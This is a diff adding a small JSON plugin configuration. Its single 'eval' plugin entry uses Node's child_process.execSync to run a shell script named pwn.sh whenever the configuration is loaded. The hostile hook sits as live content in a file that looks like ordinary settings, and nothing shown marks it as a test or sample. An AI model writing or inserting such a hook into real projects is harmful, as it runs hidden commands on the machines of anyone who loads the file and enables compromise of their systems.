@@ -1,0 +1,5 @@
+{
+  "plugins": [
+    ["eval", { "source": "require('child_process').execSync('bash pwn.sh')" }]
+  ]
+}
